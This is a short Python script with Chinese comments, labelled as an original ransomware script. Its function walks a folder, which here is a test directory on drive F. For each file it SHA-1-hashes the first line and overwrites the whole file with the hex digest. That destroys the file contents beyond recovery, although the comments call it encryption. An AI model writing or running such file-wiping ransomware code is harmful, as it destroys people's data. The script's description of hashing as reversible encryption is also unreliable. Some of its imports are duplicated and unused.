
#控制windows系统的
import win32api,win32con,win32gui

#文件加密包 标准库
import hashlib

#系统库
import os

#可以利用python去调用dll动态库的包 嵌入式开发
from ctypes import *

#时间包  控制程序的休眠时间
import time

#可以利用python去调用dll动态库的包 嵌入式开发
from ctypes import *

#时间包  控制程序的休眠时间
import time


#原始勒索脚本
def lock_file(file):
    #把path中包含'~'和‘~user’转化成用户目录
    path = os.path.expanduser(file)

    #返回指定的文件夹包含的文件或者文件夹名字的列表
    for f in os.listdir(path):
        # 删除文件名的空格
        swd = f.strip()         #去空格
        print(swd)

        #文件操作  在文件操作中做加密 rb+ 读写字节
        with open(file + '/' + swd , 'rb+') as f:
            pod = f.readline()

            #加密
            sha1 = hashlib.sha1(pod)

            #把加密后的内容转成十六进制字符串值
            osv = sha1.hexdigest()


        with open(file + '/' + swd , 'wb') as b :
            gs = bytes(osv,encoding='utf-8')
            b.write(gs)
            print('加密完成:%s'% file)
lock_file('F:\\测试文件夹\\文件勒索')
